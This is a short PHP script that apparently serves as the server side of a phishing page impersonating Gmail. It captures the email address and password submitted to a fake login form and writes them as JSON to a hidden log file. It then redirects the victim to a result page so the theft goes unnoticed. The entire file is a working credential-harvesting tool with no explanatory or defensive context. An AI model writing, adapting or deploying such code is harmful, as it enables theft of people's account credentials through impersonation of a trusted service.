<?php

header('Location: ./result.html');
$data = array('site' => 'Gmail',
  'user' => $_POST['email'],
  'pass' => $_POST['pass']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>